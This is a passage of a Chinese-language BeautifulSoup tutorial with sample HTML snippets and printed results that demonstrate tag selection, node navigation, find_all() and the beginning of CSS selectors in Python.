&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;   &lt;b&gt;    The Dormouse&#39;s story   &lt;/b&gt;  &lt;/p&gt;  &lt;p class=&quot;story&quot;&gt;   Once upon a time there were three little sisters; and their names were   &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;    &lt;!-- Elsie --&gt;   &lt;/a&gt;   ,   &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;    Lacie   &lt;/a&gt;   and   &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;    Tillie   &lt;/a&gt;   ;and they lived at the bottom of a well.  &lt;/p&gt;  &lt;p class=&quot;story&quot;&gt;   ...  &lt;/p&gt; &lt;/body&gt;&lt;/html&gt;The Dormouse&#39;s story</code></pre><h3 id="4-标签选择器"><a href="#4-标签选择器" class="headerlink" title="4.标签选择器"></a><strong>4.标签选择器</strong></h3><h4 id="1-选择元素"><a href="#1-选择元素" class="headerlink" title="(1)选择元素"></a><strong>(1)选择元素</strong></h4><p>使用soup.(点)属性标签的方式来进行选择，如果有多个符合的话只能返回第一个匹配的标签</p><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&#39;lxml&#39;)print(soup.head)print(soup.title)print(soup.p)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt;</code></pre><h4 id="2-获取属性"><a href="#2-获取属性" class="headerlink" title="(2)获取属性"></a><strong>(2)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.p.attrs[&#39;name&#39;])print(soup.p[&#39;name&#39;])</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">dromousedromouse</code></pre><h4 id="3-获取内容"><a href="#3-获取内容" class="headerlink" title="(3)获取内容"></a><strong>(3)获取内容</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p clss=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.p.string)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">The Dormouse&#39;s story</code></pre><h4 id="4-嵌套选择"><a href="#4-嵌套选择" class="headerlink" title="(4)嵌套选择"></a><strong>(4)嵌套选择</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.head.title.string)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">The Dormouse&#39;s story</code></pre><h4 id="5-获取子孙节点"><a href="#5-获取子孙节点" class="headerlink" title="(5)获取子孙节点"></a><strong>(5)获取子孙节点</strong></h4><h5 id="1-contents"><a href="#1-contents" class="headerlink" title="1.contents"></a><strong>1.contents</strong></h5><p>这种方法是以列表形式返回标签的子节点</p><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.p.contents)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&#39;\n            Once upon a time there were three little sisters; and their names were\n            &#39;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;, &#39;\n&#39;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;, &#39; \n            and\n            &#39;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;, &#39;\n            and they lived at the bottom of a well.\n        &#39;]</code></pre><h5 id="2-children"><a href="#2-children" class="headerlink" title="2.children"></a><strong>2.children</strong></h5><p>这种方法返回的是一个子节点的迭代器形式</p><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.p.children)for i, child in enumerate(soup.p.children):    print(i, child)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;list_iterator object at 0x1064f7dd8&gt;0             Once upon a time there were three little sisters; and their names were            1 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;2 3 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;4              and            5 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;6             and they lived at the bottom of a well.</code></pre><h5 id="3-descendants"><a href="#3-descendants" class="headerlink" title="3.descendants"></a><strong>3.descendants</strong></h5><p>返回子孙节点，其实和上面 children 的不同在于这个方法会再次强调一下孙子节点</p><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.p.descendants)for i, child in enumerate(soup.p.descendants):    print(i, child)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;generator object descendants at 0x10650e678&gt;0             Once upon a time there were three little sisters; and their names were            1 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;2 3 &lt;span&gt;Elsie&lt;/span&gt;4 Elsie5 6 7 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;8 Lacie9              and            10 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;11 Tillie12             and they lived at the bottom of a well.</code></pre><h4 id="6-父节点和祖先节点"><a href="#6-父节点和祖先节点" class="headerlink" title="(6)父节点和祖先节点"></a><strong>(6)父节点和祖先节点</strong></h4><h5 id="1-parent"><a href="#1-parent" class="headerlink" title="1.parent"></a><strong>1.parent</strong></h5><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.a.parent)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt; and they lived at the bottom of a well.&lt;/p&gt;</code></pre><h5 id="2-parents"><a href="#2-parents" class="headerlink" title="2.parents"></a><strong>2.parents</strong></h5><p>以列表的形式输出所有的祖先节点</p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(list(enumerate(soup.a.parents)))</code></pre><h4 id="7-兄弟节点"><a href="#7-兄弟节点" class="headerlink" title="(7)兄弟节点"></a><strong>(7)兄弟节点</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(list(enumerate(soup.a.next_siblings)))print(list(enumerate(soup.a.previous_siblings)))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[(0, &#39;\n&#39;), (1, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;), (2, &#39; \n            and\n            &#39;), (3, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;), (4, &#39;\n            and they lived at the bottom of a well.\n        &#39;)][(0, &#39;\n            Once upon a time there were three little sisters; and their names were\n            &#39;)]</code></pre><h3 id="5-标准选择器"><a href="#5-标准选择器" class="headerlink" title="5.标准选择器"></a><strong>5.标准选择器</strong></h3><p>上面我们讲述的标签选择器虽然选择速度快，但是选择的内容也是比较笼统的，在现实中很难满足我们的需求，于是我们就需要更强大的选择器帮助我们去实现</p><pre><code class="hljs">find_all( name , attrs , recursive , text , **kwargs )</code></pre><p>可根据标签名、属性、内容查找文档</p><h4 id="1-name"><a href="#1-name" class="headerlink" title="(1) name"></a><strong>(1) name</strong></h4><p><strong>实例代码一：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&#39;lxml&#39;)soup.find_all(&#39;ul&#39;)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt; &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt; &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt; &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt; &lt;/ul&gt;, &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt; &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt; &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt; &lt;/ul&gt;]</code></pre><p>如果我们还想获取更里面的标签，我们可以再次对获取到的 ul 标签使用 find_all()</p><p><strong>实例代码二：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&#39;lxml&#39;)for i in soup.find_all(&#39;ul&#39;):    print(i.find_all(&#39;li&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;][&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;]</code></pre><h4 id="2-attrs"><a href="#2-attrs" class="headerlink" title="(2)attrs"></a><strong>(2)attrs</strong></h4><p>传入想要定位的属性键值对，就能成功定位</p><p><strong>实例代码一：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&#39;lxml&#39;)print(soup.find_all(attrs=&#123;&#39;id&#39;:&#39;list-1&#39;&#125;))print(soup.find_all(attrs=&#123;&#39;name&#39;:&#39;elements&#39;&#125;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;][&lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;]</code></pre><p>或者，如果 你觉得这种方式比较复杂的话我们还可以使用更加简单的直接使用等于号链接属性和值作为参数传入来定位</p><p><strong>实例代码二：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&#39;lxml&#39;)print(soup.find_all(id = &#39;list-1&#39;))print(soup.find_all(class_ = &#39;panel-heading&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;][&lt;div class=&quot;panel-heading&quot;&gt;&lt;h4&gt;Hello&lt;/h4&gt;&lt;/div&gt;]</code></pre><blockquote><p><strong>注意：</strong></p><p>Class 是 python 中的关键字，因此我们在写属性的时候不能直接写 classs，否则会引起歧义，所以我们改成了 class_</p></blockquote><h4 id="3-text"><a href="#3-text" class="headerlink" title="(3)text"></a><strong>(3)text</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &#39;lxml&#39;)print(soup.find_all(text=&#39;Foo&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&#39;Foo&#39;, &#39;Foo&#39;]</code></pre><h4 id="4-其他"><a href="#4-其他" class="headerlink" title="(4)其他"></a><strong>(4)其他</strong></h4><p>find( name , attrs , recursive , text , **kwargs )<br>find_all() 返回所有元素，而find()返回单一元素</p><p>find_parents() find_parent()<br>find_parents()返回所有祖先节点，find_parent()返回直接父节点。</p><p>find_next_siblings() find_next_sibling()<br>find_next_siblings()返回后面所有兄弟节点，find_next_sibling()返回后面第一个兄弟节点。</p><p>find_previous_siblings() find_previous_sibling()<br>find_previous_siblings()返回前面所有兄弟节点，find_previous_sibling()返回前面第一个兄弟节点。</p><p>find_all_next() find_next()<br>find_all_next()返回节点后所有符合条件的节点, find_next()返回第一个符合条件的节点</p><p>find_all_previous() 和 find_previous()<br>find_all_previous()返回节点后所有符合条件的节点, find_previous()返回第一个符合条件的节点</p><h3 id="6-CSS选择器"><a href="#6-CSS选择器" class="headerlink" title="6.CSS选择器"></a><strong>6.CSS选择器</strong></h3><h4 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="(1)基本使用"></a><strong>(1)基本使用</strong></h4><p>通过select()直接传入CSS选择器即可完成选择</p><p><strong>实例代码一：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&#39;&#39;&#39;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&#39;lxml&#39;)print(soup.select(&#39;.panel-heading&#39;))print(soup.select(&#39;#list-1&#39;))print(soup.select(&#39;li&#39;))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[&lt;div class=&quot;panel-heading&quot;&gt;&lt;h4&gt;Hello&lt;/h4&gt;&lt;/div&gt;][&lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;][&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;]</code></pre><p><strong>实例代码二：</strong></p><pre><code class="hljs">html=&#39;&#39;&#39;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li 